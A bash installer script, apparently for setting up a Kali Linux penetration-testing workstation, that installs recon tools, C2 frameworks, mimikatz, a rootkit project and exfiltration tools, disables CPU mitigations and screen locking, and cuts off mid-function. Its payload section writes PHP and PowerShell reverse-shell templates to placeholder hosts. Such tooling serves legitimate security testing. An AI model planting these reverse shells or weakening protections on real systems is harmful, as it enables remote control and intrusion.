#!/bin/bash

# ==============================================================================
# Kali Setup Tool - Ultimate Menu Version (v3.4)
# ==============================================================================
# Description: Professional Grade Engagement Suite.
# Author: Gemini CLI
# ==============================================================================

# --- Configuration & Logging ---
LOG_FILE="kali-setup.log"
exec > >(tee -a "$LOG_FILE") 2>&1
export GIT_TERMINAL_PROMPT=0
export GIT_ASKPASS=/bin/true

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Get real user info
REAL_USER=${SUDO_USER:-$USER}
USER_HOME=$(eval echo "~$REAL_USER")
DESKTOP_DIR="$USER_HOME/Desktop"
OPT_DIR="$DESKTOP_DIR/opt"
SCRIPT_DIR=$(dirname "$(realpath "$0")")

log() { echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"; }
info() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[-]${NC} $1"; exit 1; }

# --- TUI Helpers ---

check_deps() {
    if ! command -v whiptail &>/dev/null; then
        sudo apt update && sudo apt install -y whiptail
    fi
}

msgbox() {
    whiptail --title "$1" --msgbox "$2" 15 70
}

# --- Core Functions ---

check_prereqs() {
    log "Checking prerequisites..."
    [[ $EUID -ne 0 ]] && error "This script must be run as root."
    ping -c 1 google.com > /dev/null 2>&1 || error "No internet connection."
}

setup_env() {
    log "Configuring environment..."
    export DEBIAN_FRONTEND=noninteractive
    echo "* libraries/restart-without-asking boolean true" | sudo debconf-set-selections
    
    # Initialize Global Opt Directory on Desktop and Link to /opt
    mkdir -p "$OPT_DIR"
    if [[ -d "/opt" && ! -L "/opt" ]]; then
        # If /opt exists and is not a link, move contents to Desktop/opt and link it
        mv /opt/* "$OPT_DIR/" 2>/dev/null
        rmdir /opt 2>/dev/null || mv /opt /opt_backup_$(date +%s)
    fi
    ln -sfn "$OPT_DIR" /opt
    chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"

    local SCRIPT_PATH=$(realpath "$0")
    if ! grep -q "alias kali-setup" "$USER_HOME/.zshrc" 2>/dev/null; then
        echo "alias kali-setup='sudo $SCRIPT_PATH'" >> "$USER_HOME/.zshrc"
        echo "alias kali-setup='sudo $SCRIPT_PATH'" >> "$USER_HOME/.bashrc"
    fi
}

setup_aliases() {
    log "Configuring pentest aliases..."
    local ALIAS_FILE="$USER_HOME/.kali_aliases"
    cat > "$ALIAS_FILE" <<EOF
# Kali Pentest Aliases
alias l='ls -alh'
alias myip='curl -s https://ifconfig.me'
alias localip="ip a | grep 'inet ' | grep -v '127.0.0.1' | awk '{print \$2}'"
alias listening='sudo lsof -i -P -n | grep LISTEN'
alias update-kali='sudo apt update && sudo apt upgrade -y'
alias serve='python3 -m http.server'
alias sth='search-that-hash'
alias nth='name-that-hash'
alias nxc='netexec'
alias msf='msfconsole -q'
EOF
    
    if ! grep -q "source ~/.kali_aliases" "$USER_HOME/.zshrc" 2>/dev/null; then
        echo "[ -f ~/.kali_aliases ] && source ~/.kali_aliases" >> "$USER_HOME/.zshrc"
        echo "[ -f ~/.kali_aliases ] && source ~/.kali_aliases" >> "$USER_HOME/.bashrc"
    fi
    chown "$REAL_USER:$REAL_USER" "$ALIAS_FILE"
}

create_launcher() {
    local NAME=$1
    local CMD=$2
    local ICON=$3
    local CATEGORY=$4
    local TARGET="$DESKTOP_DIR/$NAME.desktop"

    # Check if command exists or is a valid file
    local BIN_NAME=$(echo $CMD | awk '{print $1}')
    if ! command -v "$BIN_NAME" &>/dev/null && [[ ! -f "$BIN_NAME" ]]; then
        # Special case for opt tools
        if [[ "$CMD" == *"/opt/"* ]]; then
             local OPT_PATH=$(echo $CMD | awk '{print $1}')
             if [[ ! -f "$OPT_PATH" ]]; then return; fi
        else
            return
        fi
    fi

    cat > "$TARGET" <<EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=$NAME
Comment=Launched via Kali Setup
Exec=$CMD
Icon=$ICON
Terminal=true
StartupNotify=false
Categories=$CATEGORY;
EOF
    chmod +x "$TARGET"
    chown "$REAL_USER:$REAL_USER" "$TARGET"
    if command -v gio &>/dev/null; then
        gio set -t string "$TARGET" metadata::xfce-exe-checksum "$(sha256sum "$TARGET" | awk '{print $1}')" 2>/dev/null
    fi
}

# --- System Optimization & Fixes ---

optimize_system() {
    log "Starting System Optimization..."
    
    # 1. Hypervisor Detection & Guest Tools
    if command -v virt-what &>/dev/null; then
        local VM=$(virt-what | head -n 1)
        case "$VM" in
            virtualbox)
                log "VirtualBox detected. Installing Guest Additions..."
                sudo apt install -y virtualbox-guest-x11 virtualbox-guest-dkms
                # Fix shared folder permissions
                if grep -q "vboxsf" /etc/group; then
                    sudo usermod -aG vboxsf "$REAL_USER"
                fi
                ;;
            vmware)
                log "VMware detected. Installing Open VM Tools..."
                sudo apt install -y open-vm-tools-desktop
                ;;
            kvm|qemu)
                log "Qemu/KVM detected. Installing Guest Agent..."
                sudo apt install -y qemu-guest-agent spice-vdagent
                ;;
            *) log "Bare metal or unknown hypervisor detected." ;;
        esac
    else
        sudo apt update && sudo apt install -y virt-what
        optimize_system # Recursive call once installed
    fi

    # 2. Performance: Disable GRUB Mitigations
    if ! grep -q "mitigations=off" /etc/default/grub; then
        log "Applying GRUB performance tweaks (mitigations=off)..."
        sudo sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT="quiet"/GRUB_CMDLINE_LINUX_DEFAULT="quiet mitigations=off"/' /etc/default/grub
        sudo update-grub
        warn "GRUB updated. Reboot required for performance gains."
    fi

    # 3. Legacy Protocol Support (OSCP/CTF Compatibility)
    log "Configuring legacy protocol support..."
    
    # SMB LANMAN1
    if [[ -f "/etc/samba/smb.conf" ]] && ! grep -q "client min protocol = LANMAN1" /etc/samba/smb.conf; then
        sudo sed -i '/\[global\]/a \   client min protocol = LANMAN1' /etc/samba/smb.conf
    fi

    # SSH Wide Compatibility
    if [[ -f "/usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf" ]]; then
        sudo cp -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf
        sudo systemctl restart ssh 2>/dev/null
    fi

    # 4. Silence PC Beep
    echo "blacklist pcspkr" | sudo tee /etc/modprobe.d/nobeep.conf > /dev/null

    info "System Optimization complete."
}

install_legacy_python() {
    log "Installing Legacy Python 2 and Pip2..."
    sudo apt install -y python2 python2-dev
    curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
    sudo python2 get-pip.py
    rm get-pip.py
    info "Python 2 and Pip2 installed."
}

# --- Installation Modules ---

install_base() {
    log "Installing base system tools..."
    sudo apt update -y && sudo apt upgrade -y
    sudo apt install -y git perl tree htop gdu python3-pip python3-venv \
        curl wget npm jq nmap chromium parallel bleachbit exploitdb btop \
        bashtop dos2unix pipx rlwrap feroxbuster gobuster proxychains4 docker.io
    sudo systemctl enable docker --now
    if [ -n "$SUDO_USER" ]; then sudo usermod -aG docker "$SUDO_USER"; fi

    # Create Launchers for Base Tools
    create_launcher "Btop" "btop" "btop" "System;Monitor"
    create_launcher "Bashtop" "bashtop" "btop" "System;Monitor"
    create_launcher "Chromium" "chromium" "chromium" "Network;WebBrowser"
    create_launcher "BleachBit" "bleachbit" "bleachbit" "System;Settings"
    create_launcher "Burp Suite" "burpsuite" "burpsuite" "Network;Exploitation"
    create_launcher "Wireshark" "wireshark" "wireshark" "Network;Sniffing"
    create_launcher "Metasploit" "msfconsole" "kali-menu" "Network;Exploitation"
}

install_python_env() {
    log "Configuring Python tools via Pipx..."
    local RUN_AS="sudo -u $REAL_USER"
    $RUN_AS pipx ensurepath
    local TOOLS=("bbot" "search-that-hash" "name-that-hash" "mitmproxy" "autopwn-suite" "spiderfoot" "holehe" "maigret" "h8mail" "ghunt" "Vailyn" "Sublist3r" "Cr3dOv3r" "One-Lin3r" "malwoverview")
    for t in "${TOOLS[@]}"; do
        $RUN_AS pipx install "$t" --force
    done
}

install_go() {
    log "Installing latest Go..."
    local LATEST_GO=$(curl -s https://go.dev/VERSION?m=text | head -n 1)
    if [[ ! -d "/usr/local/go" ]] || [[ $(/usr/local/go/bin/go version 2>/dev/null) != *"$LATEST_GO"* ]]; then
        curl -LO "https://golang.org/dl/${LATEST_GO}.linux-amd64.tar.gz"
        sudo rm -rf /usr/local/go
        sudo tar -C /usr/local -xzf "${LATEST_GO}.linux-amd64.tar.gz"
        rm "${LATEST_GO}.linux-amd64.tar.gz"
    fi
    export PATH="$PATH:/usr/local/go/bin:~/go/bin"
    
    # Go-based Recon Tools
    local GO_BIN="/usr/local/go/bin/go"
    if [[ -f "$GO_BIN" ]]; then
        $GO_BIN install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
        $GO_BIN install github.com/j3ssie/osmedeus@latest
        $GO_BIN install github.com/sensepost/gowitness@latest
        $GO_BIN install github.com/OWASP/Amass/v3/...@master
    fi
}

install_heavy_automation() {
    log "Installing Heavy Recon Automation..."
    
    # Large Frameworks
    local REPOS=(
        "https://github.com/eslam3kl/3klCon"
        "https://github.com/yogeshojha/rengine"
        "https://github.com/six2dez/reconftw"
        "https://github.com/shmilylty/OneForAll"
        "https://github.com/Screetsec/Sudomy"
        "https://github.com/R0X4R/Garud"
    )
    for repo in "${REPOS[@]}"; do
        local NAME=$(basename "$repo")
        if [[ ! -d "/opt/$NAME" ]]; then
            sudo git clone --depth 1 "$repo" "/opt/$NAME" 2>/dev/null
        fi
    done
    
    # OneForAll setup (Python 3)
    if [[ -d "/opt/OneForAll" ]]; then
        sudo pip3 install --break-system-packages -r "/opt/OneForAll/requirements.txt"
    fi
    
    sudo chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"
    # Create Launchers
    create_launcher "reNgine" "chromium http://localhost:8000" "kali-menu" "Network;Recon"
}

install_rev_eng() {
    log "Installing Reverse Engineering & Post-Ex Suite..."
    sudo apt install -y ghidra
    
    # Ghidra Dark Theme
    if [[ ! -d "/opt/ghidra-dark-theme" ]]; then
        sudo git clone --depth 1 https://github.com/zackelia/ghidra-dark-theme.git "/opt/ghidra-dark-theme" 2>/dev/null
    fi
    
    # Post-Ex Tools
    if [[ ! -d "/opt/PEASS-ng" ]]; then
        sudo git clone --depth 1 https://github.com/peass-ng/PEASS-ng.git "/opt/PEASS-ng" 2>/dev/null
    fi
    if [[ ! -d "/opt/PlumHound" ]]; then
        sudo git clone --depth 1 https://github.com/Screetsec/PlumHound.git "/opt/PlumHound" 2>/dev/null
    fi
    
    # Vuln Tools
    if [[ ! -d "/opt/GPT_Vuln-analyzer" ]]; then
        sudo git clone --depth 1 https://github.com/codingo/GPT_Vuln-analyzer.git "/opt/GPT_Vuln-analyzer" 2>/dev/null
    fi
    sudo chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"
}

install_oscp() {
    log "Installing OSCP Approved Tools..."
    local RUN_AS="sudo -u $REAL_USER"
    sudo apt install -y smbmap nikto snmp-check enum4linux-ng responder \
        evil-winrm ffuf hashcat john neo4j bloodhound seclists \
        python3-impacket impacket-scripts
    
    # BloodHound Service
    sudo systemctl enable neo4j --now
    
    $RUN_AS pipx install netexec --force
    $RUN_AS pipx install bloodhound --force
    $RUN_AS pipx install impacket --force
    $RUN_AS pipx install git+https://github.com/Tib3rius/AutoRecon.git --force
    
    # Ligolo-ng
    local LIGOLO_VER=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | jq -r .tag_name)
    wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_linux_amd64.tar.gz" -O /tmp/ligolo_agent.tar.gz
    wget -q "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER#v}_linux_amd64.tar.gz" -O /tmp/ligolo_proxy.tar.gz
    sudo tar -C /usr/local/bin -xzf /tmp/ligolo_agent.tar.gz agent && sudo mv /usr/local/bin/agent /usr/local/bin/ligolo-agent
    sudo tar -C /usr/local/bin -xzf /tmp/ligolo_proxy.tar.gz proxy && sudo mv /usr/local/bin/proxy /usr/local/bin/ligolo-proxy
    rm /tmp/ligolo_*.tar.gz
    
    local GO_BIN="/usr/local/go/bin/go"
    if [[ -f "$GO_BIN" ]]; then
        $GO_BIN install github.com/jpillora/chisel@latest
        $GO_BIN install github.com/21y4d/nmapAutomator@latest
        $GO_BIN install github.com/ropnop/kerbrute@latest
    fi
    
    if [[ ! -d "/opt/PEASS-ng" ]]; then
        sudo git clone --depth 1 https://github.com/peass-ng/PEASS-ng.git "/opt/PEASS-ng" 2>/dev/null
    fi

    # Specialized Windows binaries for OSCP
    mkdir -p "/opt/win-bins"
    wget -q "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe" -O "/opt/win-bins/Rubeus.exe" 2>/dev/null
    wget -q "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -O "/opt/win-bins/mimikatz.zip" 2>/dev/null
    
    sudo chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"

    # Create Launchers
    create_launcher "NetExec" "$USER_HOME/.local/bin/nxc" "kali-menu" "Network;Exploitation"
    create_launcher "BloodHound" "bloodhound" "bloodhound" "Network;Exploitation"
    create_launcher "Evil-WinRM" "evil-winrm" "kali-menu" "Network;Exploitation"
    create_launcher "Responder" "responder -I eth0" "kali-menu" "Network;Exploitation"
    create_launcher "AutoRecon" "$USER_HOME/.local/bin/autorecon" "kali-menu" "Network;Recon"
}

install_vuln_scanners() {
    log "Installing Vulnerability Scanners..."
    local RUN_AS="sudo -u $REAL_USER"
    
    # Batch Clone Scanners
    local REPOS=(
        "https://github.com/Dionach/CMSmap"
        "https://github.com/Tuhinshubhra/RED_HAWK"
        "https://github.com/0xrawsec/rapidscan"
        "https://github.com/sullo/nikto"
        "https://github.com/andresriancho/w3af"
        "https://github.com/vulnersCom/nmap-vulners"
        "https://github.com/scipag/vulscan"
        "https://github.com/v1n3sh/scant3r"
        "https://github.com/m4ll0k/BugBountyScanner"
        "https://github.com/TebbaaX/eternal_scanner"
    )
    for repo in "${REPOS[@]}"; do
        local NAME=$(basename "$repo")
        if [[ ! -d "/opt/$NAME" ]]; then
            sudo git clone --depth 1 "$repo" "/opt/$NAME" 2>/dev/null
        fi
    done

    # GPT Vuln-analyzer (Python 3)
    if [[ -d "/opt/GPT_Vuln-analyzer" ]]; then
        $RUN_AS pip3 install --break-system-packages -r "/opt/GPT_Vuln-analyzer/requirements.txt"
    fi
    sudo chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"
}

install_legacy_tools() {
    log "Installing Legacy & Niche Tools..."
    
    # Python 2 based tools
    local PY2_REPOS=(
        "https://github.com/Tuhinshubhra/RED_HAWK"
        "https://github.com/thelinuxchoice/thefatrat"
        "https://github.com/Mebus/cupp"
        "https://github.com/leebaird/discover"
        "https://github.com/Tuhinshubhra/TIDoS-Framework"
    )
    for repo in "${PY2_REPOS[@]}"; do
        local NAME=$(basename "$repo")
        if [[ ! -d "/opt/$NAME" ]]; then
            sudo git clone --depth 1 "$repo" "/opt/$NAME" 2>/dev/null
        fi
    done
    
    # Batch Clone Misc Tools
    local MISC_REPOS=(
        "https://github.com/obheda12/autoenum"
        "https://github.com/epi052/ispy"
        "https://github.com/denizparlak/sandmap"
        "https://github.com/leebaird/magicRecon"
        "https://github.com/milo2012/purple-pwny"
        "https://github.com/D4Vinci/Cuteit"
        "https://github.com/hacker-Xp/beta"
        "https://github.com/darkoperator/resource_files"
        "https://github.com/everest-engineering/recon-ninja"
        "https://github.com/m4ll0k/Shennina"
        "https://github.com/TryCatchHCF/Cloakify"
    )
    for repo in "${MISC_REPOS[@]}"; do
        local NAME=$(basename "$repo")
        if [[ ! -d "/opt/$NAME" ]]; then
            sudo git clone --depth 1 "$repo" "/opt/$NAME" 2>/dev/null
        fi
    done

    # Misc Tools
    sudo apt install -y dnsrecon dnstwist msfpc
    sudo chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"
}

install_interesting_tools() {
    log "Installing Interesting & Obscure Tools..."
    
    # Lateral Movement & Post-Ex
    if [[ ! -d "/opt/Amnesiac" ]]; then
        sudo git clone --depth 1 https://github.com/Leo4j/Amnesiac.git "/opt/Amnesiac" 2>/dev/null
    fi
    if [[ ! -d "/opt/PowerOpsToolKit" ]]; then
        sudo git clone --depth 1 https://github.com/SujalMeghwal/PowerOpsToolKit.git "/opt/PowerOpsToolKit" 2>/dev/null
    fi
    
    # Stealth & Rootkits (eBPF)
    if [[ ! -d "/opt/TripleCross" ]]; then
        sudo git clone --depth 1 https://github.com/h3xduck/TripleCross.git "/opt/TripleCross" 2>/dev/null
    fi
    
    # Exfiltration
    if [[ ! -d "/opt/PacketWhisper" ]]; then
        sudo git clone --depth 1 https://github.com/D4V3-R/PacketWhisper.git "/opt/PacketWhisper" 2>/dev/null
    fi
    
    # Specialized 
    if [[ ! -d "/opt/ligolo-ng" ]]; then
         sudo git clone --depth 1 https://github.com/nicocha30/ligolo-ng.git "/opt/ligolo-ng" 2>/dev/null
    fi

    sudo chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"
}

install_c2_frameworks() {
    log "Installing C2 & Payload Frameworks..."
    local RUN_AS="sudo -u $REAL_USER"
    
    # Sliver (using existing script logic)
    if [[ -f "$SCRIPT_DIR/install-sliver.sh" ]]; then
        chmod +x "$SCRIPT_DIR/install-sliver.sh"
        sudo "$SCRIPT_DIR/install-sliver.sh"
    fi

    # Empire & Starkiller
    sudo apt install -y powershell-empire starkiller
    
    # Hoaxshell
    if [[ ! -d "/opt/hoaxshell" ]]; then
        sudo git clone --depth 1 https://github.com/t3l3machus/hoaxshell.git "/opt/hoaxshell" 2>/dev/null
    fi
    $RUN_AS pip3 install --break-system-packages -r "/opt/hoaxshell/requirements.txt"
    
    # Batch Clone C2/Payload Tools
    local TOOLS=(
        "https://github.com/zerosum0x0/koadic"
        "https://github.com/Veil-Framework/Veil"
        "https://github.com/r00t-3xp10it/venom"
        "https://github.com/trustedsec/unicorn"
        "https://github.com/byt3bl33d3r/SILENTTRINITY"
        "https://github.com/hlldz/SpookFlare"
        "https://github.com/tiagorlampert/CHAOS"
        "https://github.com/HavocFramework/Havoc"
    )
    for repo in "${TOOLS[@]}"; do
        local NAME=$(basename "$repo")
        if [[ ! -d "/opt/$NAME" ]]; then
            sudo git clone --depth 1 "$repo" "/opt/$NAME" 2>/dev/null
        fi
    done

    sudo chown -R "$REAL_USER:$REAL_USER" "$OPT_DIR"
    # Create Launchers
    create_launcher "Empire" "powershell-empire" "kali-menu" "Network;Exploitation"
    create_launcher "Starkiller" "starkiller" "kali-menu" "Network;Exploitation"
}

# --- Pro Operational Modules ---

setup_api_vault() {
    log "Entering API Vault Configuration..."
    local SHODAN_KEY=$(whiptail --title "API Vault" --inputbox "Enter Shodan API Key (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)
    local VT_KEY=$(whiptail --title "API Vault" --inputbox "Enter VirusTotal API Key (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)
    local CENSYS_ID=$(whiptail --title "API Vault" --inputbox "Enter Censys ID (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)
    local CENSYS_SECRET=$(whiptail --title "API Vault" --inputbox "Enter Censys Secret (Leave blank to skip):" 10 60 3>&1 1>&2 2>&3)

    # Example: Inject into BBOT config
    if [[ -n "$SHODAN_KEY" ]]; then
        mkdir -p "$USER_HOME/.config/bbot"
        echo "modules:" > "$USER_HOME/.config/bbot/bbot.yml"
        echo "  shodan:" >> "$USER_HOME/.config/bbot/bbot.yml"
        echo "    api_key: $SHODAN_KEY" >> "$USER_HOME/.config/bbot/bbot.yml"
        info "Shodan key injected into BBOT config."
    fi
    # Additional injection logic for h8mail, Spiderfoot etc. would go here
    msgbox "API Vault" "Keys processed. (Note: Encryption-at-rest not yet implemented for these plain configs)."
}

setup_wordlists_payloads() {
    log "Configuring Wordlists & Payloads..."
    sudo apt install -y seclists
    # Unpack RockYou
    if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
        sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
    fi
    
    mkdir -p "$USER_HOME/Payloads"
    # Create simple shell templates
    cat > "$USER_HOME/Payloads/php-reverse.php" <<EOF
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
EOF
    cat > "$USER_HOME/Payloads/powershell-rev.ps1" <<EOF
\$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendbyte);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
EOF
    chown -R "$REAL_USER:$REAL_USER" "$USER_HOME/Payloads"
    info "SecLists ready and Payloads directory initialized."
}

setup_pro_browser() {
    log "Hardening Firefox for Pentesting..."
    sudo apt install -y firefox-esr
    
    # 1. Automate via Firefox Policies
    local POLICY_DIR="/usr/lib/firefox-esr/distribution"
    sudo mkdir -p "$POLICY_DIR"
    cat <<EOF | sudo tee "$POLICY_DIR/policies.json"
{
  "policies": {
    "Proxy": {
      "Mode": "manual",
      "Locked": false,
      "HTTPProxy": "127.0.0.1:8080",
      "UseHTTPProxyForAllProtocols": true,
      "Passthrough": "localhost, 127.0.0.1"
    },
    "Extensions": {
      "Install": [
        "https://addons.mozilla.org/firefox/downloads/latest/foxyproxy-standard/latest.xpi",
        "https://addons.mozilla.org/firefox/downloads/latest/wappalyzer/latest.xpi",
        "https://addons.mozilla.org/firefox/downloads/latest/cookie-editor/latest.xpi"
      ]
    },
    "Certificates": {
       "Install": ["/usr/local/share/ca-certificates/BurpSuiteCA.crt"]
    }
  }
}
EOF
    
    # 2. Prepare Burp CA placeholder (User still needs to export it to this path once)
    sudo touch /usr/local/share/ca-certificates/BurpSuiteCA.crt
    sudo update-ca-certificates 2>/dev/null

    info "Firefox hardened via system-wide policies (Proxy configured, Extensions queued)."
}

disable_power_management() {
    log "Disabling Power Saving, Screensaver, and Sleep Targets..."
    local RUN_AS="sudo -u $REAL_USER"
    
    # XFCE
    if command -v xfconf-query &>/dev/null; then
        log "Configuring XFCE Power Settings..."
        # Screensaver
        $RUN_AS xfconf-query -c xfce4-screensaver -p /saver/enabled -n -t bool -s false 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-screensaver -p /lock-screen/enabled -n -t bool -s false 2>/dev/null
        
        # Power Manager - AC
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/blank-on-ac -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-ac-sleep -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-ac-off -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/inactivity-on-ac -n -t int -s 0 2>/dev/null
        
        # Power Manager - Battery
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/blank-on-battery -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-battery-sleep -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/dpms-on-battery-off -n -t int -s 0 2>/dev/null
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/inactivity-on-battery -n -t int -s 0 2>/dev/null
        
        # General
        $RUN_AS xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/lock-screen-suspend-hibernate -n -t bool -s false 2>/dev/null
    fi
    
    # GNOME
    if command -v gsettings &>/dev/null; then
        log "Configuring GNOME Power Settings..."
        $RUN_AS gsettings set org.gnome.desktop.session idle-delay 0 2>/dev/null
        $RUN_AS gsettings set org.gnome.desktop.screensaver lock-enabled false 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-timeout 0 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-timeout 0 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type 'nothing' 2>/dev/null
        $RUN_AS gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-type 'nothing' 2>/dev/null
    fi
    
    # General X11
    if command -v xset &>/dev/null; then
        $RUN_AS xset s off 2>/dev/null
        $RUN_AS xset -dpms 2>/dev/null
    fi

    # System-wide Masking (Absolute Always On)
    log "Applying System-wide Sleep Masking..."
    systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target
    
    info "Power saving and screensaver disabled (System-wide)."
}

setup_pro_networking() {
    local SUB=$(whiptail --title "Advanced Networking" --menu "Select Option:" 15 60 5 \
        "1" "Configure Proxychains (Auto-Tor)" \
        "2" "Persistent Ligolo-ng Service" \
        "3" "VPN Profile Manager (OpenVPN)" \
        "4" "Back" 3>&1 1>&2 2>&3)

    case $SUB in
        1)
            log "Configuring Proxychains for Tor..."
            sudo apt install -y tor
            sudo systemctl enable tor --now
            sudo sed -i 's/#dynamic_chain/dynamic_chain/' /etc/proxychains4.conf
            sudo sed -i 's/strict_chain/#strict_chain/' /etc/proxychains4.conf
            info "Proxychains configured to use dynamic chain with Tor."
            ;;
        2)
            log "Creating Ligolo-ng background service..."
            cat <<EOF | sudo tee /etc/systemd/system/ligolo-proxy.service
[Unit]
Description=Ligolo-ng Proxy Service
After=network.target
[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/ligolo-proxy -selfcert
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
            sudo systemctl daemon-reload
            sudo systemctl enable ligolo-proxy --now
            info "Ligolo-ng is now running as a persistent background service."
            ;;
        3) mkdir -p "$USER_HOME/Documents/VPN"; msgbox "VPN" "Profiles directory: ~/Documents/VPN";;
    esac
}

# --- System Audit & Theme ---

run_audit() {
    log "Running System Audit..."
    local REPORT="[System] Disk Free: $(df -h / | awk 'NR==2 {print $4}')\n\n"
    
    # Smarter detection for tools that might not be in the current script's PATH yet
    check_tool() {
        local TOOL_NAME=$1
        # 1. Check standard path
        if command -v "$TOOL_NAME" &>/dev/null; then echo "OK"; return; fi
        # 2. Check Pipx/Local bin
        if [[ -f "$USER_HOME/.local/bin/$TOOL_NAME" ]]; then echo "OK (Local Path)"; return; fi
        # 3. Check Go bin
        if [[ -f "/usr/local/go/bin/$TOOL_NAME" ]]; then echo "OK (/usr/local/go)"; return; fi
        if [[ -f "$USER_HOME/go/bin/$TOOL_NAME" ]]; then echo "OK (Go Path)"; return; fi
        
        echo "MISSING"
    }

    local TOOLS=("nmap" "msfconsole" "docker" "pipx" "go" "bbot" "nuclei" "osmedeus" "netexec")
    for t in "${TOOLS[@]}"; do 
        REPORT+="[Tool] $t: $(check_tool "$t")\n"
    done

    REPORT+="\nNOTE: If tools show as OK (Local Path) or OK (Go), you may need to restart your terminal or run 'source ~/.zshrc' for them to be available in your current session."
    
    msgbox "System Health Audit" "$REPORT"
}

backup_config() {
    log "Backing up configurations..."
    local BACKUP_DIR="$USER_HOME/Kali_Backup_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$BACKUP_DIR"
    cp "$USER_HOME/.zshrc" "$BACKUP_DIR/" 2>/dev/null
    cp "$USER_HOME/.bashrc" "$BACKUP_DIR/" 2>/dev/null
    cp "$USER_HOME/.kali_aliases" "$BACKUP_DIR/" 2>/dev/null
    [[ -d "$USER_HOME/.config/bbot" ]] && cp -r "$USER_HOME/.config/bbot" "$BACKUP_DIR/"
    chown -R "$REAL_USER:$REAL_USER" "$BACKUP_DIR"
    msgbox "Backup" "Configs backed up to: $BACKUP_DIR"
}

repair_desktop_icons() {
    log "Repairing desktop icons..."
    local RUN_AS="sudo -u $REAL_USER"
    if command -v gio &>/dev/null; then
        for f in "$DESKTOP_DIR"/*.desktop; do
            [[ -f "$f" ]] || continue
            gio set -t string "$f" metadata::xfce-exe-checksum "$(sha256sum "$f" | awk '{print $1}')" 2>/dev/null
        done
    fi
    msgbox "Repair" "Desktop icon metadata refreshed."
}

cleanup_system() {
    log "Cleaning system..."
    sudo apt autoremove -y
    sudo apt clean
    sudo rm -rf /tmp/*
    # Clear logs older than 7 days
    sudo find /var/log -type f -name "*.log" -mtime +7 -delete
    msgbox "Cleanup" "System cleanup complete."
}

install_xfce_desktop() {
    log "Installing XFCE..."
    sudo apt install -y kali-desktop-xfce xfce4-panel
    msgbox "XFCE Installed" "XFCE Desktop Environment has been installed.\n\nIMPORTANT: You MUST log out and select 'XFCE Session' from the login screen (or restart the system) before features like Undercover Mode or XFCE theme settings will work."
}

set_wallpaper() {
    local WP_DIR="Wallpapers"
    if [[ ! -d "$WP_DIR" ]]; then
        msgbox "Error" "Wallpaper directory not found: $WP_DIR"
        return
    fi

    local OPTIONS=()
    while IFS= read -r file; do
        OPTIONS+=("$file" "")
    done < <(ls "$WP_DIR")

    local CHOICE=$(whiptail --title "Set Desktop Wallpaper" --menu "Select a wallpaper:" 20 70 10 "${OPTIONS[@]}" 3>&1 1>&2 2>&3)
    
